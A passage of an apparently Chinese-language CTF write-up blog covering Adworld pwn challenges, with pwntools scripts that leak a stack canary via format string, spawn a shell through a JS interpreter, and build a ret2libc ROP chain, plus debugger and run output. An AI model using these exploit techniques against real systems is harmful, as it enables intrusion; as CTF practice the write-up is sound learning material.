</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>C4</span>                 <span class=n>mov</span>     <span class=n>rax</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>var_8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>C8</span>                 <span class=n>xor</span>     <span class=n>rax</span><span class=p>,</span> <span class=nl>fs</span><span class=p>:</span><span class=mi>28</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>D1</span>                 <span class=n>jz</span>      <span class=kt>short</span> <span class=n>locret_4009D8</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>D3</span>                 <span class=n>call</span>    <span class=n>___stack_chk_fail</span>
</span></span></code></pre></div><p>程序保护机制状态</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>vincebye</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=mi>1</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nl>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
</span></span><span class=line><span class=cl>    <span class=nl>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
</span></span><span class=line><span class=cl>    <span class=o>**</span><span class=nl>Stack</span><span class=p>:</span>    <span class=n>Canary</span> <span class=n>found</span>
</span></span><span class=line><span class=cl>    <span class=nl>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
</span></span><span class=line><span class=cl>    <span class=nl>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=nf>PIE</span> <span class=p>(</span><span class=mh>0x400000</span><span class=p>)</span>
</span></span></code></pre></div><p>一个格式化字符串漏洞，一个溢出漏洞，查了一点资料应该是根据格式化字符串漏洞泄露出canary的地址，然后进行覆盖修改，可是我还是不会啊，每一题都是看答案的，怎么办</p><p>刚开始在栈视图里找不到canary参数的存在，后面看了一下，在汇编中，var_8就是canary,rename了一下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=o>-</span><span class=mo>00000000000000</span><span class=mi>90</span> <span class=n>buf</span>             <span class=n>db</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>000000000000008F</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>00000000000000</span><span class=mi>8</span><span class=n>E</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>00000000000000</span><span class=mi>8</span><span class=n>D</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>00000000000000</span><span class=mi>8</span><span class=n>C</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>00000000000000</span><span class=mi>8</span><span class=n>B</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>D</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>C</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>B</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>A</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=mi>9</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=mi>8</span> <span class=n>canary</span>          <span class=n>dq</span> <span class=o>?</span>
</span></span></code></pre></div><p>在栈中，buf参数与canary参数相差17</p><p>又我们在格式化字符串漏洞路径输入AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p,看一下AAAAAAAA在printf输出参数的第几个参数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>r</span>
</span></span><span class=line><span class=cl><span class=n>Starting</span> <span class=nl>program</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>vincebye</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=mi>1</span> 
</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>the</span> <span class=n>battle</span> <span class=o>!</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Great</span> <span class=n>Fairy</span><span class=p>]</span> <span class=n>level</span> <span class=n>pwned</span> 
</span></span><span class=line><span class=cl><span class=n>Select</span> <span class=n>your</span> <span class=n>weapon</span> 
</span></span><span class=line><span class=cl><span class=mf>1.</span> <span class=n>Stack</span> <span class=n>Bufferoverflow</span> <span class=n>Bug</span> 
</span></span><span class=line><span class=cl><span class=mf>2.</span> <span class=n>Format</span> <span class=n>String</span> <span class=n>Bug</span> 
</span></span><span class=line><span class=cl><span class=mf>3.</span> <span class=n>Exit</span> <span class=n>the</span> <span class=n>battle</span> 
</span></span><span class=line><span class=cl><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>AAAAAAAA</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span><span class=o>-%</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>AAAAAAAA</span><span class=o>-</span><span class=mh>0x7fffffffde90</span><span class=o>-</span><span class=mh>0x7f</span><span class=o>-</span><span class=mh>0x7ffff7af2151</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=mh>0x4141414141414141</span><span class=o>-</span><span class=mh>0x252d70252d70252d</span><span class=o>-</span><span class=mh>0x2d70252d70252d70</span><span class=o>-</span><span class=mh>0x70252d70252d7025</span><span class=o>-</span><span class=mh>0x252d70252d70252d</span><span class=o>-</span><span class=mh>0x2d70252d70252d70</span><span class=o>-</span><span class=mh>0x70252d70252d7025</span><span class=o>-</span><span class=mh>0xa70252d70252d</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>nil</span><span class=p>)</span>
</span></span></code></pre></div><p>可得为第六个参数，则我们通过输入%23$p就可以得到canary的参数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#GetCanary</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;%23$p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;battle</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>接下来需要溢出，然后执行函数还要覆盖canary，但是好像也不知道怎么看溢出参数,栈视图与格式化字符串的一致，一般来说canary后面就是EBP了，就按这个算吧</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#p=process(&#39;1&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;111.200.241.244&#39;</span><span class=p>,</span><span class=s1>&#39;63130&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#GetCanary</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;%23$p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Exit the battle </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;send:2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;send:payload&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span><span class=o>=</span><span class=n>canary</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>canary</span><span class=p>,</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>canary</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#Overflow</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;BBBBBBBB&#39;</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x00000000004008E3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Exit the battle </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>我也不知道为什么我和人家一模一样都错了，调试了一晚上，浪费了一晚上时间，算了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>vincebye</span><span class=nd>@ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=n>Mary_Morton</span><span class=err>$</span> <span class=n>python3</span> <span class=mf>2.</span><span class=n>py</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=mf>111.200.241.244</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>63130</span><span class=p>:</span> <span class=n>Done</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;Welcome to the battle ! </span><span class=se>\n</span><span class=s1>[Great Fairy] level pwned </span><span class=se>\n</span><span class=s1>Select your weapon </span><span class=se>\n</span><span class=s1>1. Stack Bufferoverflow Bug </span><span class=se>\n</span><span class=s1>2. Format String Bug </span><span class=se>\n</span><span class=s1>3. Exit the battle </span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>:</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>:</span><span class=n>payload</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;0x8df273a9386430&#39;</span>
</span></span><span class=line><span class=cl><span class=mi>39954550290408496</span>
</span></span><span class=line><span class=cl><span class=mh>0x8df273a9386430</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;0d8</span><span class=se>\xa9</span><span class=s1>s</span><span class=se>\xf2\x8d\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
</span></span><span class=line><span class=cl><span class=o>-&gt;</span> <span class=n>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0d8</span>\<span class=n>xa9s</span>\<span class=n>xf2</span>\<span class=n>x8d</span>
</span></span><span class=line><span class=cl><span class=err>$</span>                                                                                                                                                   <span class=o>***</span> <span class=n>stack</span> <span class=n>smashing</span> <span class=n>detected</span> <span class=o>***</span><span class=p>:</span> <span class=o>./</span><span class=n>mary_morton</span> <span class=n>terminated</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Got</span> <span class=n>EOF</span> <span class=k>while</span> <span class=n>reading</span> <span class=ow>in</span> <span class=n>interactive</span>
</span></span><span class=line><span class=cl><span class=err>$</span>
</span></span></code></pre></div><h1 id=12-monkey>12-Monkey</h1><p>是一个JS的解释器，带了3个so文件，完全没有弄过，直接看答案吧</p><p>一个JSshell，看到多个文件，第一时间想到放IDA里看代码，其实这个应该是看JS shell是否可以执行系统命令</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>vincebye</span><span class=nd>@ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=n>monkey</span><span class=err>$</span> <span class=n>nc</span> <span class=mf>111.200.241.244</span> <span class=mi>51509</span>
</span></span><span class=line><span class=cl><span class=n>js</span><span class=o>&gt;</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>bash</span><span class=p>)</span>  
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>bash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>js</span><span class=o>&gt;</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;bin/sh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;bin/sh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>
</span></span><span class=line><span class=cl><span class=nb>bin</span>
</span></span><span class=line><span class=cl><span class=n>dev</span>
</span></span><span class=line><span class=cl><span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=n>js</span>
</span></span><span class=line><span class=cl><span class=n>lib</span>
</span></span><span class=line><span class=cl><span class=n>lib32</span>
</span></span><span class=line><span class=cl><span class=n>lib64</span>
</span></span><span class=line><span class=cl><span class=n>libnspr4</span><span class=o>.</span><span class=n>so</span>
</span></span><span class=line><span class=cl><span class=n>libplc4</span><span class=o>.</span><span class=n>so</span>
</span></span><span class=line><span class=cl><span class=n>libplds4</span><span class=o>.</span><span class=n>so</span>
</span></span><span class=line><span class=cl><span class=n>run</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=n>cat</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=n>cyberpeace</span><span class=p>{</span><span class=mi>9510</span><span class=n>da9cf0f4d01b6bacfca44b688f6f</span><span class=p>}</span>
</span></span></code></pre></div><h1 id=pwn-100>Pwn-100</h1><p>函数清单</p><p><img src=https://s3-us-west-2.amazonaws.com/secure.notion-static.com/be98e720-7773-4cd3-8c9f-2fc16e36e518/Untitled.png alt=Untitled></p><p>虽然有NX保护，但是直接写入shell看看</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./pwn100&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># p = remote(&#34;111.198.29.45&#34;,&#34;49404&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./pwn100&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>72</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>+=</span><span class=n>payload</span><span class=o>+</span><span class=n>shellcode</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>果然不行，程序里没有system函数，没有/bin/sh字符串，该如何拿到flag呢？,看答案</p><h2 id=方法一libcsearch>方法一：LibcSearch</h2><p>首先，查找一下gadgets</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>vincebye</span><span class=nd>@ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>ctf</span><span class=o>/</span><span class=n>adworld1</span><span class=o>/</span><span class=n>pwn</span><span class=o>-</span><span class=mi>100</span><span class=err>$</span> <span class=n>ROPgadget</span> <span class=o>--</span><span class=n>binary</span> <span class=n>pwn100</span> <span class=o>--</span><span class=n>only</span> <span class=s2>&#34;pop|ret&#34;</span> <span class=o>|</span><span class=n>grep</span> <span class=n>rdi</span>
</span></span><span class=line><span class=cl><span class=mh>0x0000000000400763</span> <span class=p>:</span> <span class=n>pop</span> <span class=n>rdi</span> <span class=p>;</span> <span class=n>ret</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;pwn100&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;pwn100&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read_got</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1>#main_addr=elf.sym[&#39;main&#39;] KeyError: &#39;main&#39;</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span><span class=o>=</span><span class=mh>0x00000000004006B8</span>
</span></span><span class=line><span class=cl><span class=n>puts_addr</span><span class=o>=</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span><span class=o>=</span><span class=mh>0x0000000000400763</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=mi>72</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>read_got</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span> <span class=c1>#并没有报错，需要一个总量</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#不是很理解这里为什么sym地址也需要在后面添加返回地址</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read_got_addr</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>read_got_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>read_got_addr</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>read_got_addr</span><span class=o>=</span><span class=n>read_got_addr</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>elif</span> <span class=n>read_got_addr</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>:]</span><span class=o>==</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>read_got_addr</span><span class=o>=</span><span class=n>read_got_addr</span><span class=p>[:</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=n>read_got_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>read_got_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read_got_addr</span><span class=o>=</span><span class=n>read_got_addr</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;\x&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;test&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>read_got_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#补充8字节大小</span>
</span></span><span class=line><span class=cl><span class=n>read_got_addr</span><span class=o>=</span><span class=n>read_got_addr</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read_got_addr</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>read_got_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Libc数据库查询</span>
</span></span><span class=line><span class=cl><span class=n>obj</span><span class=o>=</span><span class=n>LibcSearcher</span><span class=p>(</span><span class=s2>&#34;read&#34;</span><span class=p>,</span><span class=n>read_got_addr</span><span class=p>)</span><span class=c1>#这个传参得是十进制的吗？</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#获取libc_base</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span><span class=o>=</span><span class=n>read_got_addr</span><span class=o>-</span><span class=n>obj</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#获取system地址</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>obj</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#获取/bin/sh地址</span>
</span></span><span class=line><span class=cl><span class=n>bin_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>obj</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;str_bin_sh&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>bin_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>No</span> <span class=n>matched</span> <span class=n>libc</span><span class=p>,</span> <span class=n>please</span> <span class=n>add</span> <span class=n>more</span> <span class=n>libc</span> <span class=ow>or</span> <span class=k>try</span> <span class=n>others</span>
